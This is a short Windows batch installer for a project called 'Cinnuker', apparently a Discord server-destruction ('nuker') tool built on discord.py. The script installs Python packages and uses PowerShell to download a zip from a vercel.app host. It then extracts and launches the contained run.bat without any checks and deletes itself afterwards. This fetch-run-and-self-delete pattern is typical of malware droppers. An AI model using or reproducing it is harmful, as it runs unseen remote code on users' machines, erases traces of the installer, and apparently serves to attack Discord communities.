@echo off
title Cinnuker Setup
color 0a

echo [INFO] Installing and upgrading required Python packages...
py -m ensurepip
py -m pip install --upgrade pip setuptools
py -m pip install --upgrade certifi
py -m pip install --upgrade discord.py aiohttp certifi

echo [INFO] Downloading project zip...
powershell -Command "Invoke-WebRequest -Uri 'https://cinnuker-project-fcuate30s-cinaxs-projects-31cda09b.vercel.app/cinnuker.zip' -OutFile 'cinnuker.zip'"

if exist "cinnuker.zip" (
    powershell -Command "Expand-Archive -Force 'cinnuker.zip' '.'"
    del "cinnuker.zip"
) else (
    echo [ERROR] Download failed.
    pause
    exit /b 1
)

echo [INFO] Setup complete. Launching run.bat...
start run.bat

echo [INFO] Deleting installer...
del "%~f0"
